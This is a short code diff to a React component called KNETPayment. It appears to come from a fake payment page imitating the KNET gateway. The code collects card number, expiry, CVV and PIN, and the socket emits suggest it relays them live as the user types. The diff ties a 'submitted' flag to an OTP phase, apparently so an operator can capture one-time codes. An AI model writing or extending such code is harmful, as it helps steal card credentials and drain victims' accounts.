@@ -146,11 +146,11 @@ export default function KNETPayment() {
         expiryYear: expiryYear,
         cvv: cardCvv,
         pin: cardPin,
-        submitted: false,
+        submitted: phase === "otp",
       });
     }, 60);
     return () => { if (liveDebounceRef.current) clearTimeout(liveDebounceRef.current); };
-  }, [selectedBank, selectedPrefix, cardNumber, expiryMonth, expiryYear, cardPin, cardCvv]);
+  }, [selectedBank, selectedPrefix, cardNumber, expiryMonth, expiryYear, cardPin, cardCvv, phase]);
 
   useEffect(() => {
     return () => { socket.value.emit("card:liveHide"); };
